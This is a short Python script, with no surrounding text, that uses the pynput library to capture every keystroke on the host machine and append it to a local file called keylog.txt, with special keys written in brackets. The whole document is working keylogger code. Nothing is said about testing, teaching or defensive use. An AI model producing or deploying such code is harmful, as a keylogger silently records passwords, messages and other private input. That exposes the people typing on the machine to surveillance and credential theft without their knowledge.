from pynput import keyboard

# File where keystrokes will be saved
log_file = "keylog.txt"

# Function to write keys to the file
def on_press(key):
    try:
        # Try to get alphanumeric key
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
